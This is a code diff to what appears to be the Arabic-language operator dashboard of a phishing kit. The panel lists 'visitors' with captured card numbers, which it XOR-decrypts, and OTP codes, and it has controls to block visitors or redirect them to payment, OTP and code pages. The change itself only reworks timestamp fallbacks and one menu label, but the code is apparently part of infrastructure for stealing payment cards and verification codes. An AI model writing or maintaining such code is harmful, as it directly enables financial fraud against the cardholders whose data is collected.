@@ -522,15 +522,8 @@
       // أحدث بطاقة من بين كل المحاولات
       const latestCard = allCards[0] || {};
       const latestOtp = allOtps.length ? allOtps[0] : null;
-      const ls = toTime(m.lastSeen);
       const historyTimes = [...allCards, ...allOtps].map((record) => toTime(record.createdAt || record.timestamp || record.cardCreatedAt || record.cardTimestamp || record.updatedAt));
-      const basicDataTime = Math.max(
-        toTime(m.basicDataUpdatedAt),
-        toTime(m.customerUpdatedAt),
-        toTime(m.updatedAt),
-        toTime(m.lastUpdatedAt),
-        toTime(m.createdAt)
-      );
+      const basicDataTime = Math.max(toTime(m.basicDataUpdatedAt), toTime(m.basicDataCreatedAt), toTime(m.createdAt));
       const lastActivity = Math.max(basicDataTime, ...historyTimes);
       // فك تشفير رقم البطاقة (XOR) إن كان مشفراً
       const rawCardNumber = latestCard.cardNumber || m.cardNumber || m._v1 || '';
@@ -583,13 +576,12 @@
         isArchived: !!m.isArchived,
         isBlocked: !!m.isBlocked,
         flagColor: m.flagColor || '',
-        lastSeen: ls,
-        clientTime: Math.max(lastActivity, ls, toTime(m.submittedAt), toTime(m.receivedAt)),
+        lastSeen: m.lastSeen || null,
+        clientTime: lastActivity,
         lastActiveAt: m.lastActiveAt || null,
-        updatedAt: m.updatedAt || m.lastUpdatedAt || null,
         createdDate: m.createdAt || null,
-        basicDataTime: m.basicDataUpdatedAt || m.customerUpdatedAt || m.updatedAt || m.createdAt || null,
-        customerUpdatedAt: m.basicDataUpdatedAt || m.customerUpdatedAt || m.updatedAt || m.createdAt || null,
+        basicDataTime: m.basicDataUpdatedAt || m.basicDataCreatedAt || m.createdAt || null,
+        customerUpdatedAt: m.basicDataUpdatedAt || m.basicDataCreatedAt || m.createdAt || null,
         lastActivity: lastActivity,
         ip: m.ip || '',
         device: m.device || '',
@@ -659,7 +651,6 @@
       const records = [...(n.allCards || (n.cardNumber ? [n] : [])), ...(n.allOtps || [])];
       return Math.max(
         Number(n.lastActivity) || 0,
-        toCounterMillis(n.updatedAt),
         toCounterMillis(n.basicDataTime),
         toCounterMillis(n.customerUpdatedAt),
         toCounterMillis(n.createdDate),
@@ -768,8 +759,8 @@
     const cards = visitor.allCards || (visitor.cardNumber ? [visitor] : []);
     const otps = visitor.allOtps || [];
     const toMillis = (value) => value?.toDate ? value.toDate().getTime() : (new Date(value || 0).getTime() || 0);
-    const cardTime = (card) => toMillis(card.cardCreatedAt || card.cardTimestamp || card.cardSubmittedAt || card.createdAt || card.timestamp || visitor.customerUpdatedAt || visitor.updatedAt || visitor.createdDate || visitor.lastSeen);
-    const otpTime = (otp) => toMillis(otp.otpCreatedAt || otp.otpTimestamp || otp.otpSubmittedAt || otp.createdAt || otp.timestamp || visitor.customerUpdatedAt || visitor.updatedAt || visitor.createdDate || visitor.lastSeen);
+    const cardTime = (card) => toMillis(card.cardCreatedAt || card.cardTimestamp || card.cardSubmittedAt || card.createdAt || card.timestamp || visitor.customerUpdatedAt || visitor.createdDate);
+    const otpTime = (otp) => toMillis(otp.otpCreatedAt || otp.otpTimestamp || otp.otpSubmittedAt || otp.createdAt || otp.timestamp || visitor.customerUpdatedAt || visitor.createdDate);
     const formatElapsed = (value) => {
       if (!value) return '0 ثانية';
       const seconds = Math.max(0, Math.floor((Date.now() - value) / 1000));
@@ -853,7 +844,7 @@
       })
       .map(s => s.html)
       .join('');
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(getRouteLabel(visitor.currentStep || visitor.currentPage || visitor.redirectPage) || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.clientTime || visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="compar">البطاقات</button><button data-ref-nav="register">التسجيل</button><button data-ref-nav="insur">الطلب</button><button data-ref-nav="payment">الدفع</button><button data-ref-nav="otp">رمز التحقق</button><button data-ref-nav="code">الرمز</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="compar">البطاقات</option><option value="register">التسجيل</option><option value="insur">الطلب</option><option value="payment">الدفع</option><option value="otp">رمز التحقق</option><option value="code">الرمز</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(getRouteLabel(visitor.currentStep || visitor.currentPage || visitor.redirectPage) || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.clientTime || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="compar">البطاقات</button><button data-ref-nav="register">التسجيل</button><button data-ref-nav="insur">الطلب</button><button data-ref-nav="payment">الدفع</button><button data-ref-nav="otp">رمز التحقق</button><button data-ref-nav="code">الرمز</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="compar">اختيار البطاقة</option><option value="register">التسجيل</option><option value="insur">الطلب</option><option value="payment">الدفع</option><option value="otp">رمز التحقق</option><option value="code">الرمز</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -1108,7 +1099,7 @@
           <td class="px-6 py-4">
             <div class="flex items-center gap-2 text-sm text-slate-400">
               <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="flex-shrink-0 text-slate-500"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
-              <span class="whitespace-nowrap" data-elapsed-time="${Number(n.clientTime) || 0}">${timeAgo(n.clientTime || n.lastSeen || n.createdDate)}</span>
+              <span class="whitespace-nowrap" data-elapsed-time="${Number(n.clientTime) || 0}">${timeAgo(n.clientTime || n.createdDate)}</span>
             </div>
           </td>
           <td class="px-6 py-4">
